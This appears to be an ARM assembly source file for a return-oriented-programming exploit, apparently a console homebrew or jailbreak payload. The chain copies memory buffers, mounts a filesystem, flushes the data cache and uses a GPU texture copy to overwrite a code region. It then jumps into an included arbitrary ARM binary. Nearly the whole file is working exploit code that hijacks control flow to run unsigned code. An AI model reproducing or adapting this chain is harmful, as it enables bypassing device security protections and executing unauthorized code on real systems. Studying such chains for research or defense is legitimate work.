	.arm
	.text

#include "rop.h"

#ifdef ARM_CODE
	#define CODE_SIZE		arm_code_end-arm_code
#else
	#define CODE_SIZE		0x300*15-0x460
#endif

	.global	_start
@---------------------------------------------------------------------------------
_start:
	rop_memcpy(BUFFER_LOC+0x300*0, ROP_LOC+0x304*1, 0x300)
	rop_memcpy(BUFFER_LOC+0x300*1, ROP_LOC+0x304*2, 0x300)
	rop_memcpy(BUFFER_LOC+0x300*2, ROP_LOC+0x304*3, 0x300)
	rop_memcpy(BUFFER_LOC+0x300*3, ROP_LOC+0x304*4, 0x300)

	rop_memcpy(BUFFER_LOC+0x300*4, ROP_LOC+0x1400+0x304*0, 0x300)
	rop_memcpy(BUFFER_LOC+0x300*5, ROP_LOC+0x1400+0x304*1, 0x300)
	rop_memcpy(BUFFER_LOC+0x300*6, ROP_LOC+0x1400+0x304*2, 0x300)
	rop_memcpy(BUFFER_LOC+0x300*7, ROP_LOC+0x1400+0x304*3, 0x300)
	rop_memcpy(BUFFER_LOC+0x300*8, ROP_LOC+0x1400+0x304*4, 0x300)

	rop_memcpy(BUFFER_LOC+0x300*9, ROP_LOC+0x2800+0x304*0, 0x300)
	rop_memcpy(BUFFER_LOC+0x300*10, ROP_LOC+0x2800+0x304*1, 0x300)
	rop_memcpy(BUFFER_LOC+0x300*11, ROP_LOC+0x2800+0x304*2, 0x300)
	rop_memcpy(BUFFER_LOC+0x300*12, ROP_LOC+0x2800+0x304*3, 0x300)
	rop_memcpy(BUFFER_LOC+0x300*13, ROP_LOC+0x2800+0x304*4, 0x300)

	rop_fs_mount(DMC)

	.fill 3, 4, POP_PC
	.word POP_R0_PC
@.org 0x21C
	.word MAGIC

	rop_flush_data_cache(BUFFER_LOC+arm_code-0x300, CODE_SIZE)
	rop_gx_texture_copy(BUFFER_LOC+arm_code-0x300, CODE_TARGET, CODE_SIZE)
	rop_flush_data_cache(BUFFER_LOC, 0x38400*2)
	rop_gx_texture_copy(BUFFER_LOC, 0x1F48F000, 0x38400*2)
	rop_sleep(1000000000)

@	rop_sleep(1000000000)
@	rop_flush_data_cache(BUFFER_LOC, 0x38400)
@	rop_gx_texture_copy(BUFFER_LOC, 0x1F4C7800, 0x38400)
@	rop_sleep(1000000000)

	rop_jump_arm

.org 0x300
.org 0x3F4
	.word ROP_LOC+_start+0x8C
.org 0x428
	.word ROP_LOC+_start, 0, POP_PC
.org 0x458
	.word POP_PC, POP_PC
arm_code:
#ifdef ARM_CODE
	#define S_(x)	#x
	#define S(x)	S_(x)
	.incbin S(ARM_CODE)
#endif
arm_code_end:
